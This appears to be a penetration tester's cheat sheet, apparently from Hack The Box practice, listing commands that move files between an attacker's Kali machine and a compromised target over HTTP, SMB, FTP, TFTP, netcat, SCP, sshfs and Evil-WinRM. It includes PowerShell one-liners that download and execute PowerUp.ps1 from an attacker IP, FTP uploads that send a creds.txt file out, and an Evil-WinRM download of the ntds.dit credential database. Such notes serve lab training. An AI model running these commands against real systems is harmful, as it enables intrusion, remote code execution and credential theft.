# File Transfer

### HTTP

{% code overflow="wrap" %}
```bash
# HTTP Server

# Python module
python2 -m SimpleHTTPServer 80 
python3 -m http.server 80

# pip install updog
# https://github.com/sc0tfree/updog
# This has an upload function
updog 80

# HTTP client

wget http://<ip address>/<file>
curl http://<ip address>/<file>  --output <file>

# Certutil
certutil -urlcache -split -f http://<ip address>/<file>

# Powershell
PS>Invoke-WebRequest -URI http://<ip address>/<file> -OutFile C:\Users\Cortin\<file>
PS>(New-Object Net.WebClient).DownloadString('http://<10.10.14.8/PowerUp.ps1')
CMD>powershell -c iex(New-Object Net.WebClient).DownloadString('http://<10.10.14.8/PowerUp.ps1')

PS>Import-Module BitsTransfer; Start-BitsTransfer -Source http://192.168.119.128/target.txt -Destination .
```
{% endcode %}

### SMB

{% code overflow="wrap" %}
```bash
# -- SMB v2 server -- 
# Simplified version

# Kali
sudo impacket-smbserver smb $(pwd) -smb2support -user iptracej -password iptracej

# Target
iex (new-Object Net.WebClient).DownloadString('http://10.10.14.4/privesc/SMB2.ps1'); SMB2 -IPAddress 10.10.14.4


# Manual version

# Kali
sudo impacket-smbserver smb $(pwd) -smb2support -user user  -password password

# Target
$pass = convertto-securestring 'user' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('user', $pass)
New-PSDrive -Name kali -PSProvider FileSystem -Credential $cred -Root \\<Kali IP>\smb

# -- SMB v1 server -- 

# Kali
sudo impacket-smbserver smb .

# Target
\\<Kali IP>\smb
```
{% endcode %}

### FTP

{% code overflow="wrap" %}
```bash
# python ftp module
# sudo apt-get install python3-pyftpdlib	
sudo python3 -m pyftpdlib -p 21 -w

# Linux target
ftp

# Windows target
# Binary file
$client = New-Object System.Net.WebClient
$client.Credentials = New-Object System.Net.NetworkCredential("anonymous", "anonymous")
$client.UploadFile("ftp://192.168.119.128/creds.txt", "C:\inetpub\wwwroot\creds.txt")

# ASCII
# Should be 5 or later
$psversiontable 

Compress-Archive -Path C:\inetpub\wwwroot\creds.txt -DestinationPath C:\inetpub\wwwroot\creds.txt.zip
$client = New-Object System.Net.WebClient
$client.Credentials = New-Object System.Net.NetworkCredential("anonymous","anonymous")
$client.UploadFile("ftp://192.168.119.128/creds.txt.zip", "C:\inetpub\wwwroot\creds.txt.zip")
```
{% endcode %}

### TFTP

{% code overflow="wrap" %}
```bash
# Very old UDP based File transfer protocol. By default, it is installed on Windows machines up to Windows XP and 2003.
# https://www.linux.com/topic/networking/trivial-transfers-tftp-part-3-usage/

# Kail
# apt-get install tftp
mkdir /tftp 
atftpd --daemon --port 69 /tftp 
cp /usr/share/windows-binaries/<file> /tftp/

# Windows XP and 2003
tftp 10.10.10.10

tftp> status
tftp> verbose
tftp> binary
tftp> get HERE_I_AM
```
{% endcode %}

### Netcat

<pre class="language-bash"><code class="lang-bash"><strong># Reciver 
</strong>nc -l -p 1235 > nineveh.png

# Sender
nc -w 3 10.10.14.3 1235 &#x3C; nineveh.png
</code></pre>

### SCP

```bash
scp /path/to/source/file.ext username@x.x.x.x
scp -r /path/to/source/dir username@x.x.x.x

# Kali
sudo systemctl start ssh
sudo mkdir /mnt/dropplet
# Target
scp -r /mnt/opt/* iptracej@<Kali IP>:/mnt/dropplet
```

### sshfs

mount the file system via ssh

{% code overflow="wrap" %}
```bash
# Target
sudo systemctl start ssh
sudo systemctl status ssh

# Kali
sudo apt install sshfs
# create a mount point
sudo mkdir /mnt/droplet
# Ensure you are not in /mnt/droplet 
cd ~
# connect to remote system and mount the location
sudo sshfs -o allow_other,default_permissions iptracej@<target IP>:/var/www/html /mnt/droplet 
```
{% endcode %}

Evil-winrm

```bash
Evil-WinRM* PS C:\temp> download <file>
Evil-WinRM* PS C:\temp> download C:\temp\ntds.dit /home/iptracej/htb/Monteverde/download/ntds.dit

Evil-WinRM* PS C:\temp> upload <file>
Evil-WinRM* PS C:\temp> upload nc.exe
```
